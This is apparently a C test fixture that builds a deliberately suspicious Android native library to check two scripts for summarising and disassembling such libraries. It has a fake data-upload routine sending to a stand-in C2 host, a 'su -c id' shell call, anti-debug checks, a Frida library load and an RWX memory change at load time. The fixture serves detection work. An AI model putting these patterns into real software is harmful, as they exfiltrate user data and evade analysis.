// Fixture for checking scripts/native-summary.py and scripts/native-disasm.py after a
// change. Not part of any analysis. A deliberately suspicious library: network, shell,
// anti-debug, a load-time constructor, and JNI methods registered by table.
//
// Build (needs clang with the aarch64 target and lld; no NDK or libc required):
//   clang --target=aarch64-linux-android24 -O1 -fPIC -shared -nostdlib -fuse-ld=lld \
//     -Wl,-z,undefs -s scripts/fixtures/native-fixture.c -o /tmp/libfixture.so
//   add -Wl,--pack-dyn-relocs=android   for APS2 packed relocations
//   add -Wl,-z,pack-relative-relocs     for RELR
// Check:
//   scripts/native-summary.py --file /tmp/libfixture.so
//     expect: 1 init function, Java_com_evil_app_Native_ping, a 3-entry JNI table
//     (upload, runCmd, checkEnv), imports under network / process execution /
//     dynamic loading / memory protection / debug, the URL and paths under strings.
//   scripts/native-disasm.py /tmp/libfixture.so --jni
//     expect: import names on calls, strings on address loads, JNIEnv->RegisterNatives.
typedef struct { const char *name; const char *sig; void *fn; } JNINativeMethod;
struct JNINativeInterface; typedef const struct JNINativeInterface *JNIEnv;
struct JNIInvokeInterface; typedef const struct JNIInvokeInterface *JavaVM;
struct JNIInvokeInterface { void *r[6]; int (*GetEnv)(JavaVM*, void**, int); };
struct JNINativeInterface { void *r[6]; void *(*FindClass)(JNIEnv*, const char*); void *pad[208]; int (*RegisterNatives)(JNIEnv*, void*, const JNINativeMethod*, int); };
extern int socket(int,int,int); extern int connect(int,const void*,int); extern long send(int,const void*,long,int);
extern int system(const char*); extern void *dlopen(const char*,int); extern long ptrace(int,int,void*,void*);
extern void *fopen(const char*,const char*); extern int mprotect(void*,long,int);
static const char *C2 = "https://c2.example.invalid/upload";
static int upload(JNIEnv *e, void *thiz, void *data) { int s = socket(2,1,0); connect(s, C2, 16); return (int)send(s, data, 64, 0); }
static void runCmd(JNIEnv *e, void *thiz, void *cmd) { system("su -c id"); }
static int checkEnv(JNIEnv *e, void *thiz) { if (fopen("/proc/self/maps","r")) ptrace(0,0,0,0); dlopen("/data/local/tmp/frida-agent.so", 2); return 0; }
static const JNINativeMethod methods[] = {
  {"upload", "([B)I", (void*)upload}, {"runCmd", "(Ljava/lang/String;)V", (void*)runCmd}, {"checkEnv", "()Z", (void*)checkEnv} };
__attribute__((constructor)) static void early(void) { mprotect((void*)0x1000, 4096, 7); }
int JNI_OnLoad(JavaVM *vm, void *reserved) {
  JNIEnv *env; if ((*vm)->GetEnv(vm, (void**)&env, 0x10006)) return -1;
  void *cls = (*env)->FindClass(env, "com/evil/app/Native");
  (*env)->RegisterNatives(env, cls, methods, 3); return 0x10006; }
int Java_com_evil_app_Native_ping(JNIEnv *e, void *thiz) { return 42; }
